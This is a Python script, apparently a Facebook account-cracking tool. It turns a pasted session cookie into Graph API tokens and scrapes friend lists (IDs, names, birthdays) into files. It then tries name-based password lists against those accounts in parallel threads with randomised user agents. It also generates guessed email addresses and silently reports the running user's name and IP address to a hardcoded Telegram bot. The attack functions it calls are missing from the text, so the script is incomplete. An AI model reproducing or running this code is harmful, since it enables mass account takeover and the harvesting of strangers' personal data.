
from os import path
import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket,multiprocessing,bs4
import os,base64,zlib,pip,urllib,time,logging,urllib.request
from time import localtime as lt
from os import system as cmd
from bs4 import BeautifulSoup as bs
from concurrent.futures import ThreadPoolExecutor as TPE
try:
        import os,requests,json,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n \033[1;37m[\u001b[36m•\033[1;37m] INSTALLING MISSING MODULES ')
        os.system('pip install requests futures==2 > /dev/null')
        os.system('python run.py')
except:pass

#--> STYLE COLOR

Z = '\x1b[38;5;232m' # Hitam
M = '\x1b[38;5;196m' # Merah
H = '\x1b[38;5;46m'  # Hijau
K = '\x1b[38;5;226m' # Kuning
U = '\x1b[38;5;54m'  # Ungu
O = '\x1b[38;5;51m'  # Biru Muda
P = '\x1b[38;5;231m' # Putih
J = '\x1b[38;5;208m' # Jingga
A = '\x1b[38;5;248m' # Abu-Abu

#--> MACHINE SUPPORT

ip = requests.get("https://api.ipify.org").text
ERROR_MESSAGE = "AN ERROR OCCURRED: %s"

#--------------------[ DATE AND TIME ]--------------#

dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
ltx = int(lt()[3])

#--> ID MADE

def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz

#------------------[ USER AGENT ]-------------------#

fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]

for xd in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12','13'])
        c=f' TL-tl; {str(gt)}'
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

#------------------[ LOGO-BANNER ]-------------------#

logo=("""\033[1;37m


██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░\u001b[31mSAFAL
\033[1;37m-------------------------------------------
 GITHUB      : safalgg
 FACEBOOK    : Anonymous
 VERSION     :\u001b[32m 2.0\033[1;37m
\033[1;37m-------------------------------------------""")

#------------------[ ALL DEFS HERE ]-------------------#

def back():
    menu()
def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def linex():
    print('\033[1;37m-------------------------------------------')
def clear():
    os.system('clear')
    print(logo)
def animasi():
    print('\r%s [%s•%s] %sDUMPING %s%s %sIDz'%(M,P,M,P,M,str(len(dump)),P),end=''); sys.stdout.flush()
def bot():
    os.system('python .b')

G = "\u001b[32m"
B = "\u001b[36m"
W = "\033[1;37m"
pemisah = '|'
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
sys.stdout.write('\x1b]2; SAFAL THE GOD\x07')

#------------------[ CONTACT ADMIN ]-------------------#

def contact():
	clear()
	print(" [\u001b[36m1\033[1;37m] CONTACT ADMIN IN FACEBOOK")
	print(" [\u001b[36m2\033[1;37m] DIRECT SENT MESSAGE TO ADMIN")
	print(" [\u001b[36m0\033[1;37m] BACK")
	linex()
	admin = input(" CHOOSE : ")
	if admin in ['1']:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100047224122870')
		back()
	elif admin in ['2']:
		linex()
		message = input(' [\u001b[36m•\033[1;37m] ENTER YOUR MESSAGE : ')
		requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fj/sendMessage?chat_id=6118288082&text=" + "NAME : " + username + "\nMESSAGE : " + message + "")
		linex()
		animation(" [\u001b[36m>\033[1;37m] YOUR MESSAGE HAS BEEN SENT TO ADMIN ")
		input(" [\u001b[36m>\033[1;37m] ENTER TO BACK ")
		back()
	elif admin in ['0']:
		back()
	elif (IOError,KeyError):
		linex()
		print(" [\u001b[36m×\033[1;37m] NO OPTION FOUND IN MENU ")
		time.sleep(2)
		back()

#------------------[ NAME-ASKER ]-------------------#

def get_username():
    username = input(f" [{B}•{W}] ENTER YOUR REAL NAME : ")
    with open('.nam.txt', 'w') as f:
        f.write(username)
    return username
def get_saved_username():
    if os.path.exists('.nam.txt'):
        with open('.nam.txt', 'r') as f:
            username = f.read().strip()
    else:
        username = get_username()
    return username
username = get_saved_username()
pass
requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6118288082&text=THIS USER IS USING V5\nNAME : " + username + "\nIP ADDRESS : " + ip )

#------------------[ APPROVAL SYSTEM ]-------------------#

def approval():
	time.sleep(1)
	id = str(os.geteuid())
	clear()
	animation("\033[1;37m [\u001b[36m•\033[1;37m] YOU NEED APPROVAL TO USE THIS TOOL   \033[1;37m")
	print("\033[1;37m [\u001b[36m•\033[1;37m] YOUR DEVICE IP :\u001b[36m "+ip);time.sleep(0.1)
	print ("""\033[1;37m----------------------------------------------""")
	try:
		httpCaht = requests.get("https://github.com/Safalgg/Origg/blob/main/Approved.txt").text
		if id in httpCaht:
			animation("\033[1;97m [\u001b[36m>\033[1;37m] YOUR DEVICE HAS BEEN APPROVED !!!")
			msg = str(os.geteuid())
			time.sleep(1)
			pass
		else: 
			animation("\x1b[1;97m [\u001b[36m>\033[1;37m] YOUR DEVICE HAS NOT BEEN APPROVED ");
			animation(" [\u001b[36m>\033[1;37m] PER KEY 150 ")
			time.sleep(0.1)
			input(' [\u001b[36m>\033[1;37m] CLICK ENTER TO SEND AN APPROVAL ')
			linex()
			msg = input(' [\u001b[36m•\033[1;37m] ENTER YOUR MESSAGE : ')
			requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6118288082&text=" + "NAME : " + username + "\nIP ADDRESS : " + ip + "\nMESSAGE : " + msg + "\nENCRYPTED KEY : "+id)
			linex()
			animation("\x1b[1;97m [\u001b[36m>\033[1;37m] REQUEST HAS BEEN RECIEVED ")
			time.sleep(1)
			os.system('xdg-open https://www.facebook.com/profile.php?id=100047224122870')
			exit()
	except Exception as e:
		logging.error(ERROR_MESSAGE, e)
		exit()
approval()


#--> Remove Duplicate Idz

def remove_dup():
    clear()
    try:
        filename = input(f" {M}[{P}>{M}]{P} ENTER FILE NAME : ")
        sd = '/sdcard/'
        file_path = os.path.join(sd, filename)
        with open(file_path, 'r') as file:
            lines = file.read().splitlines()
        lines = sorted(set(lines))
        with open(file_path, 'w') as file:
            for line in lines:
                file.write(line + '\n')
        linex()
        print(f' {M}[{P}✔{M}]{P} SUCCESSFULLY REMOVED')
        input(f' {M}[{P}•{M}]{P} ENTER TO BACK ')
        back()
    except (KeyError,IOError):
        linex()
        print(f' {M}[{P}✘{M}]{P} FILE NOT FOUND TRY AGAIN ')
        time.sleep(2)
        remove_dup()

#--> FILE MAKING MACHINE SUPPORT

class login:
    def __init__(self):
        self.xyz = requests.Session()
        self.check_cookies()
        dump_friendlist()
    def check_cookies(self):
        try:
            self.cookie     = {'cookie':open('login/cookie.json','r').read()}
            self.token_eaag = open('login/token_eaag.json','r').read()
            self.token_eaab = open('login/token_eaab.json','r').read()
            self.token_eaat = open('login/token_eaat.json','r').read()
            req1 = self.xyz.get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(self.token_eaag),cookies=self.cookie).json()['name']
            req2 = self.xyz.get('https://graph.facebook.com/me/friends?fields=summary&limit=0&access_token=%s'%(self.token_eaab),cookies=self.cookie).json()['summary']['total_count']
            req3 = self.xyz.get('https://graph.facebook.com/me?fields=friends.limit(0).fields(id,name,birthday)&access_token=%s'%(self.token_eaat),cookies=self.cookie).json()['friends']
            clear()
        except Exception as e:
            self.insert_cookie()
    def insert_cookie(self):
        clear()
        ciko = input(f' {M}[{P}•{M}]{P} ENTER COOKIE : ')
        self.token_eaag = self.generate_token_eaag(ciko)
        self.token_eaab = self.generate_token_eaab(ciko)
        self.token_eaat = self.generate_token_eaat(ciko)
        try:os.mkdir("login")
        except:pass
        open('login/cookie.json','w').write(ciko)
        open('login/token_eaag.json','w').write(self.token_eaag)
        open('login/token_eaab.json','w').write(self.token_eaab)
        open('login/token_eaat.json','w').write(self.token_eaat)
        self.check_cookies()
    def generate_token_eaag(self,cok):
        url = 'https://business.facebook.com/business_locations'
        req = self.xyz.get(url,cookies={'cookie':cok})
        try:
            tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
        except AttributeError:
            linex()
            animation(f" {M}[{P}✘{M}]{P} COOKIE EXPIRED")
            exit()
        return(str(tok))
    def generate_token_eaab(self,cok):
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = self.xyz.get(url,cookies={'cookie':cok})
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = self.xyz.get(nek,cookies={'cookie':cok})
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        return(str(tok))
    def generate_token_eaat(self,cok):
        self.cookie = {'cookie':cok}
        data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}
        req  = self.xyz.post('https://graph.facebook.com/v16.0/device/login/',data=data).json()
        cd   = req['code']
        ucd  = req['user_code']
        url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd)
        req  = bs(self.xyz.get('https://mbasic.facebook.com/device',cookies=self.cookie).content,'html.parser')
        raq  = req.find('form',{'method':'post'})
        dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}
        rel  = 'https://mbasic.facebook.com' + raq['action']
        pos  = bs(self.xyz.post(rel,data=dat,cookies=self.cookie).content,'html.parser')
        dat  = {}
        raq  = pos.find('form',{'method':'post'})
        for x in raq('input',{'value':True}):
            try:
                if x['name'] == '__CANCEL__' : pass
                else: dat.update({x['name']:x['value']})
            except Exception as e: pass
        rel = 'https://mbasic.facebook.com' + raq['action']
        pos = bs(self.xyz.post(rel,data=dat,cookies=self.cookie).content,'html.parser')
        req = self.xyz.get(url,cookies=self.cookie).json()
        tok = req['access_token']
        return(str(tok))

class dump_friendlist:
    def __init__(self):
        global dump
        dump = self.dump = []
        self.fail        = []
        self.pisah       = pemisah
        self.xyz         = requests.Session()
        self.cookie      = {'cookie':open('login/cookie.json','r').read()}
        self.token_eaat  = open('login/token_eaat.json','r').read()
        self.main()
    def main(self):
        print(' %s[%s•%s] %sYESARI UID XUTTA  (,)'%(M,P,M,P))
        linex()
        id = input(' %s[%s•%s] %sUID HAAAL : '%(M,P,M,P)).split(',')
        linex()
        for f in id:
            if f == 'me': io = f
            elif (re.findall("[a-zA-Z]",str(f))) : io = user_to_id(f)
            else : io = f
            self.check(io)
        linex()
        for d in self.fail:
            try: id.remove(d)
            except Exception as e: continue
        with TPE(max_workers=30) as ABC:
            for s in id:
                if s == 'me': io = s
                elif (re.findall("[a-zA-Z]",str(s))) : io = user_to_id(s)
                else : io = s
                ABC.submit(self.requ,io)
        if len(self.dump) == 0:
            print('\r%s [%s✘%s] FAIL TO DUMP%s'%(M,P,M,P))
        else: print(' \r%s [%s✔%s] %sSUCCESSFULLY DUMP %s%s %sIDz'%(M,P,M,P,M,str(len(self.dump)),P))
    def check(self,id):
        try: 
            nama  = str(self.xyz.get('https://graph.facebook.com/%s?fields=name&access_token=%s'%(id,self.token_eaat),cookies=self.cookie).json()['name'])
            teman = str(self.xyz.get('https://graph.facebook.com/%s?fields=friends.limit(0).fields(id,name,birthday)&access_token=%s'%(id,self.token_eaat),cookies=self.cookie).json()['friends']['summary']['total_count'])
            print(' %s• %s%s %s--> %s%s FRIENDLIST'%(M,P,nama,M,P,teman))
        except Exception as e:
            print(' %s• %s%s %s--> %sFRIENDLIST/PRIVATE'%(M,P,id,M,P))
            self.fail.append(id)
    def requ(self,id):
        url = 'https://graph.facebook.com/%s?fields=friends.limit(5000).fields(id,name,birthday)&access_token=%s'%(id,self.token_eaat)
        try:
            req = self.xyz.get(url,cookies=self.cookie).json()
            for y in req['friends']['data']:
                try:
                    id, nama = y['id'], y['name']
                    format = '%s%s%s'%(id,self.pisah,nama)
                    self.dump.append(format)
                    animasi()
                except Exception as e: pass
        except Exception as e: pass

class save_file:
    def __init__(self):
        self.main()
    def main(self):
        self.main2()
    def main2(self):
        try:
            linex()
            print(f' {M}[{P}•{M}]{P} WRITE FILE NAME WITHOUT /sdcard/ ')
            nm  = input(f' {M}[{P}•{M}]{P} ENTER FILE NAME : ').replace(' ','_')
            lk = '/sdcard/'
            lok = '%s%s'%(lk,nm)
            open(lok,'a+')
            for d in dump:
                try: open(lok,'a+').write(d+'\n')
                except Exception as e: pass
            linex()
            print(f' {M}[{P}✔{M}]{P} DUMP FILE SAVED AS %s'%(lok))
            dubb = input(f" {M}[{P}✔{M}]{P} REMOVE DUPLICATE IDz (y/n) : ")
            if dubb in ['y','Y']: remove_dup()
            elif dubb in ['n','N']: exit()
            elif KeyError:
                exit()
        except Exception as e:
            linex()
            print(f' {M}[{P}✘{M}]{P} VETENA RAMRARI HAAL')
            time.sleep(1)
            to = input(f' {M}[{P}✘{M}]{P} FERI LEKHXAS? (y/n) : ')
            if to in   ['y','Y']: save_file()
            elif to in ['n','N']: back()
        except (KeyError,IOError):
            save_file()

def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as NEPAL:
                        total = str(len(fo))
                        clear()
                        print(' Total account : \033[1;32m'+total)
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in fo:
                                ids,names = user.split('|')
                                first_name = names.rsplit(' ')[0]
                                try:
                                        last_name = names.rsplit(' ')[1]
                                except IndexError:
                                        last_name = 'Khan'
                                fs = first_name.lower()
                                ls = last_name.lower()
                                passlist = [fs+ls,fs+' '+ls,fs+'12',fs+'123',fs+'12345',fs+'123456',fs,fs+'1234',fs+'786',fs+'12']
                                NEPAL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python NEPAL.py')

#------------------[ MENU'S ]-------------------#

def menu():
        try:
                clear()
                x = ("sex")
                if x == ("sex"):
                        print(f" [{B}•{W}] WELCOME      : "+ username)
                        print(f" [{B}•{W}] TODAY'S DATE : "+ date)
                        linex()
                        print(" [\u001b[36m1\033[1;37m] CRACK FILE         [\u001b[36m4\033[1;37m] CHECK RESULTS")
                        print(" [\u001b[36m2\033[1;37m] MAKE FILE          [\u001b[36m5\033[1;37m] CHANGE NAME")
                        print(" [\u001b[36m3\033[1;37m] REMOVE DUP IDz     [\u001b[36m6\033[1;37m] CONTACT ADMIN")
                        print(' [\u001b[36m0\033[1;37m] EXIT MENU          [\u001b[36m7\033[1;37m] CHAT WITH NEPALAI')
                        linex()
                        xd=input(' \033[1;37m[\u001b[36m•\033[1;37m] CHOOSE : ')
                        if xd in ['1','01']:
                                clear()
                                print(' \033[1;37m[\u001b[36m•\033[1;37m] WRITE FILE NAME WITHOUT /sdcard/')
                                linex()
                                file_name = input(' \033[1;37m[\u001b[36m>\033[1;37m] FILE NAME : ')
                                if '/' in file_name:
                                    file_path = file_name
                                else:
                                    file_path = os.path.join('/sdcard/', file_name)
                                if os.path.isfile(file_path):
                                    try:
                                        fo = open(file_path, 'r').read().splitlines()
                                    except (FileNotFoundError,KeyError,IOError):
                                        print('\033[1;37m-------------------------------------------')
                                        animation(' \033[1;37m[\u001b[36m×\033[1;37m] FILE LOCATION NOT FOUND')
                                        time.sleep(2)
                                        menu()
                                elif FileNotFoundError:
                                    print('\033[1;37m-------------------------------------------')
                                    animation(' \033[1;37m[\u001b[36m×\033[1;37m] FILE LOCATION NOT FOUND')
                                    time.sleep(2)
                                    menu()
                                clear()
                                print(' \033[1;37m[\u001b[36m•\033[1;37m] ALL METHOD WORKING TRY 1 BY 1 ')
                                linex()
                                print(' \033[1;37m[\u001b[36m1\033[1;37m] FOR NEW IDz \n \033[1;37m[\u001b[36m2\033[1;37m] FOR MIX IDz (BEST)\n \033[1;37m[\u001b[36m3\033[1;37m] FOR OLD IDz')
                                linex()
                                mthd=input(' \033[1;37m[\u001b[36m•\033[1;37m] CHOOSE : ')
                                linex()
                                plist = []
                                print(' \033[1;37m[\u001b[36m•\033[1;37m] SELECT PASSWORD CRACK MENU')
                                linex()
                                print(' \033[1;37m[\u001b[36m1\033[1;37m] AUTO PASS\n \033[1;37m[\u001b[36m2\033[1;37m] CUSTOM PASS (BEST)')
                                linex()
                                ppp = input(' \033[1;37m[\u001b[36m>\033[1;37m] CHOOSE : ')
                                if ppp in ['01', '1']:
                                    plist.append('first last')
                                    plist.append('last first')
                                    plist.append('firstlast')
                                    plist.append('lastfirst')
                                    plist.append('first12')
                                    plist.append('first123')
                                    plist.append('first1234')
                                    plist.append('first1111')
                                    plist.append('first321')
                                    plist.append('last321')
                                    plist.append('first12345')
                                    plist.append('first123456')
                                    plist.append('first@123')
                                    plist.append('first@1234')
                                    plist.append('first@12345')
                                    plist.append('firstlast12')
                                    plist.append('firstlast123')
                                    plist.append('firstlast1234')
                                    plist.append('firstlast12345')
                                    plist.append('last12')
                                    plist.append('last123')
                                    plist.append('last1234')
                                    plist.append('last12345')
                                    plist.append('last123456')
                                    plist.append('lastfirst12')
                                    plist.append('lastfirst123')
                                    plist.append('lastfirst1234')
                                    plist.append('lastfirst12345')
                                    plist.append('last@123')
                                    plist.append('last@1234')
                                    plist.append('last@12345')
                                    plist.append('first123#')
                                    plist.append('first1234#')
                                    plist.append('last123#')
                                    plist.append('last1234#')
                                    plist.append('first@@123')
                                    plist.append('last@@123')
                                    plist.append('first123@')
                                    plist.append('first1234@')
                                    plist.append('last123@')
                                    plist.append('last1234@')
                                else:
                                    try:
                                        ps_limit = int(input(' \033[1;37m[\u001b[36m•\033[1;37m] SET PASSWORD LIMIT : '))
                                    except:
                                        ps_limit = 60
                                    linex()
                                    print(' First123 , Last123 , First Last')
                                    linex()
                                    for i in range(ps_limit):
                                        plist.append(input(f' \033[1;37m[\u001b[36m•\033[1;37m] PUT PASSWORD {i+1} : '))
                                cx=input(' [\u001b[36m•\033[1;37m] SHOW NG IDz (y/n) : ')
                                if cx in ['y','Y']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=40) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(' \033[1;37m[\u001b[36m•\033[1;37m] TOTAL IDz : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMETHOD >> \033[1;37mM{mthd}')
                                        print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M"))
                                        print('\033[1;37m-------------------------------------------')
                                        print(' \033[1;37m[\u001b[36m•\033[1;37m] FILE YOU CHOOSE : '+ file_name)
                                        print(" \033[1;37m[\u001b[36m•\033[1;37m] CLONE NASSAKIYE SAMMA PHONE NACHALA")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:

                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:

                                                        crack_submit.submit(api,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                linex()
                                print(' [\u001b[36m•\033[1;37m] PAISA THUS ABA '+time.strftime("%H:%M"))
